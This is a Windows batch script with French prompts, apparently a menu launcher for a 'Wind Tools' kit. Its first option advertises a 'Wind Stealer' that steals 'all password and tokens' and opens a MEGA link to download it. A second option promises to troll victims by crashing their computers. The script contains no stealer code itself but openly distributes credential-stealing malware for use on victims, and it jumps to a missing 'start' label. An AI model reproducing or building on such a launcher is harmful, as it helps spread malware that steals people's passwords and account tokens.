@echo off
color d
echo                                              Wind Tools by stardust
echo.
echo.
echo.
echo        ##      ## #### ##    ## ########      ######  ######## ########    ###    ##       ######## ########  
echo        ##  ##  ##  ##  ###   ## ##     ##    ##    ##    ##    ##         ## ##   ##       ##       ##     ## 
echo        ##  ##  ##  ##  ####  ## ##     ##    ##          ##    ##        ##   ##  ##       ##       ##     ## 
echo        ##  ##  ##  ##  ## ## ## ##     ##     ######     ##    ######   ##     ## ##       ######   ########  
echo        ##  ##  ##  ##  ##  #### ##     ##          ##    ##    ##       ######### ##       ##       ##   ##   
echo        ##  ##  ##  ##  ##   ### ##     ##    ##    ##    ##    ##       ##     ## ##       ##       ##    ##  
echo         ###  ###  #### ##    ## ########      ######     ##    ######## ##     ## ######## ######## ##     ## 
echo.
echo.
echo                                            Appuyez sur une touche !
timeout 30

cd..

color f
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo        .##......##.####.##....##.########.....##.....##.########.##....##.##.....##
echo        .##..##..##..##..###...##.##.....##....###...###.##.......###...##.##.....##
echo        .##..##..##..##..####..##.##.....##....####.####.##.......####..##.##.....##
echo        .##..##..##..##..##.##.##.##.....##....##.###.##.######...##.##.##.##.....##
echo        .##..##..##..##..##..####.##.....##....##.....##.##.......##..####.##.....##
echo        .##..##..##..##..##...###.##.....##....##.....##.##.......##...###.##.....##
echo        ..###..###..####.##....##.########.....##.....##.########.##....##..#######.
echo.                                                   
echo.
echo.
echo.
echo.
echo [1] - Wind Stealer - Steal all password and tokens
echo.
echo [2] - Wind Troller - Troll victim by crash computer, blue screen and more features... COMING SOON
echo.
echo.
echo.
echo.
echo.
set choiceinput=
set /p choiceinput= Merci de bien vouloir faire un choix : 
if %choiceinput%==1 goto choice1
if %choiceinput%==2 goto choice2
echo.
echo.

:choice1
color b
cls
echo    *************************************************************************************************
echo    .##...##..######..##..##..#####............####...######..######...####...##......######..#####..
echo    .##...##....##....###.##..##..##..........##........##....##......##..##..##......##......##..##.
echo    .##.#.##....##....##.###..##..##...........####.....##....####....######..##......####....#####..
echo    .#######....##....##..##..##..##..............##....##....##......##..##..##......##......##..##.
echo    ..##.##...######..##..##..#####............####.....##....######..##..##..######..######..##..##.
echo    *************************************************************************************************
echo.
echo.
echo.
echo.
echo.
echo.
echo.
timeout 5
echo.
echo.
echo Le lien MEGA va bientot se lancer...
echo.
echo ...
echo.
echo.
start https://mega.nz/file/7fBG1abK#yWTE-M9UlLNDoVfTU6Em0KKhXSxfgHulBrKxb_zdmUs
echo.
echo Le lien MEGA a été lancé..
echo.
echo.

pause
cls
goto start 

:choice2
color 3
cls
echo.
echo            ..##......##.####.##....##.########...#######..##......##..######.
echo            ..##..##..##..##..###...##.##.....##.##.....##.##..##..##.##....##
echo            ..##..##..##..##..####..##.##.....##.##.....##.##..##..##.##......
echo            ..##..##..##..##..##.##.##.##.....##.##.....##.##..##..##..######.
echo            ..##..##..##..##..##..####.##.....##.##.....##.##..##..##.......##
echo            ..##..##..##..##..##...###.##.....##.##.....##.##..##..##.##....##
echo            ...###..###..####.##....##.########...#######...###..###...######.
echo.
echo.
echo.
echo.
echo.
echo Le lien MEGA va bientot se lancer...
echo.
start
echo.
echo Le lien MEGA a été lancé..
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
pause